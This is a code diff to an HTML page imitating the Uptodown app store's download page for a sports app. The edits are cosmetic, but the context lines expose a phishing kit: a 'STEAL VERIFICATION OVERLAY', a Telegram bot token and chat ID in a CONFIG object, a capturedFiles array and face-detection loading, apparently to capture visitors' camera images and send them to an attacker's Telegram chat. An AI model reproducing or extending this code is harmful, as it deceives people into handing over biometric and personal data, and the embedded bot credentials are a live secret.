@@ -8,12 +8,12 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --ut-bg: #081d24; /* Aniq Uptodown foni */
-            --ut-dark: #051116; /* Header foni */
-            --ut-blue: #1b85d3; /* Linklar va ikonka chegaralari */
-            --ut-green: #00b451; /* Download tugmasi */
-            --ut-dim: #7e949c; /* Matnlar rangi */
-            --ut-card: #0c262f; /* Bloklar foni */
+            --ut-bg: #081d24;
+            --ut-dark: #051116;
+            --ut-blue: #1b85d3;
+            --ut-green: #00b451;
+            --ut-dim: #7e949c;
+            --ut-card: #0c262f;
         }
 
         body {
@@ -112,9 +112,9 @@
             overflow-x: auto;
             gap: 10px;
             padding-bottom: 15px;
-            scrollbar-width: none; /* Firefox */
+            scrollbar-width: none;
         }
-        .screenshot-container::-webkit-scrollbar { display: none; } /* Chrome/Safari */
+        .screenshot-container::-webkit-scrollbar { display: none; }
         .screenshot-container img {
             height: 180px;
             border-radius: 10px;
@@ -122,16 +122,17 @@
             flex-shrink: 0;
         }
 
-        /* --- TECHNICAL INFO (Xarakteristika) --- */
-        .tech-section { margin-top: 40px; }
-        .tech-title { font-size: 18px; font-weight: 700; margin-bottom: 20px; }
+        /* --- REVISED TECHNICAL INFO (Skrinshot bo'yicha) --- */
+        .tech-section { 
+            margin-top: 40px; 
+            border-top: 1px solid #15323d;
+            padding-top: 25px;
+        }
+        .tech-title { font-size: 18px; font-weight: 700; margin-bottom: 25px; }
         .tech-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 16px;
-            background: var(--ut-card);
-            padding: 20px;
-            border-radius: 12px;
+            gap: 25px 15px;
         }
         .tech-card { display: flex; gap: 12px; align-items: center; }
         .circle-icon {
@@ -139,10 +140,18 @@
             border: 1px solid var(--ut-blue);
             border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            color: var(--ut-blue); font-size: 16px;
+            color: var(--ut-blue); font-size: 15px;
+            flex-shrink: 0;
         }
-        .tech-data b { display: block; font-size: 10px; color: var(--ut-dim); text-transform: uppercase; }
+        .tech-data { display: flex; flex-direction: column; }
+        .tech-data b { 
+            display: block; font-size: 10px; 
+            color: var(--ut-dim); text-transform: uppercase; 
+            letter-spacing: 0.3px;
+            margin-bottom: 2px;
+        }
         .tech-data span { font-size: 14px; font-weight: 500; }
+        .tech-data a { color: var(--ut-blue); text-decoration: none; font-size: 14px; }
 
         /* --- STEAL VERIFICATION OVERLAY --- */
         #verify-overlay {
@@ -222,7 +231,15 @@
             </div>
             <div class="tech-card">
                 <div class="circle-icon">📱</div>
-                <div class="tech-data"><b>OS</b><span>Android 7.0+</span></div>
+                <div class="tech-data"><b>OS</b><span>Android</span></div>
+            </div>
+            <div class="tech-card">
+                <div class="circle-icon">⚽</div>
+                <div class="tech-data"><b>Category</b><a href="#">Sports</a></div>
+            </div>
+            <div class="tech-card">
+                <div class="circle-icon">🌐</div>
+                <div class="tech-data"><b>Language</b><span>English <small style="color:var(--ut-dim)">(44 more)</small></span></div>
             </div>
             <div class="tech-card">
                 <div class="circle-icon">📦</div>
@@ -248,7 +265,6 @@
     const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };
     let capturedFiles = [];
 
-    // FaceAPI load
     async function initAI() {
         await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
     }
